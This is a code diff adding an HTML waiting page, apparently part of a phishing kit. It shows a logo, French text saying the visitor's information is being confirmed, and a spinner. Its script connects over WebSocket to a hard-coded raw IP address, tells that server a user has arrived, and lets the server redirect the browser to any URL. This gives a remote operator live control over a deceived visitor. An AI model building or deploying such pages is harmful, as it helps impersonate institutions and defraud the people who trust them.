@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spinning Page</title>
+    <style>
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            /* Full viewport height */
+        }
+
+        .spin {
+            width: 100px;
+            height: 100px;
+            border: 10px solid #eee;
+            border-top: 10px solid #333;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .logo {
+            width: 200px;
+            /* Adjust as per your logo size */
+            height: 200px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="image/cih.png" alt="Logo" class="logo">
+        <p>Attendez un moment, nous confirmons vos informations.</p>
+        <div class="spin"></div>
+    </div>
+</body>
+<script>
+    const socket = new WebSocket('ws://206.166.251.33:80'); // Adjust the URL if your server is elsewhere
+
+    socket.onopen = () => {
+        // Inform server that a user is on the login page
+        socket.send(JSON.stringify({ type: 'navigate_user', url: 'loaded' }));
+    };
+
+    socket.onmessage = (event) => {
+        // Handle any messages received from server here
+        const data = JSON.parse(event.data);
+        // Example: if the server sends a navigation message, handle it
+        if (data.type === 'navigate') {
+            window.location.href = data.url;
+        }
+    };
+
+    socket.onerror = (error) => {
+        console.error(`WebSocket Error: ${error}`);
+    };
+
+    socket.onclose = (event) => {
+        if (event.wasClean) {
+            console.log(`Closed cleanly, code=${event.code}, reason=${event.reason}`);
+        } else {
+            console.warn('Connection died');
+        }
+    };
+</script>
+
+</html>
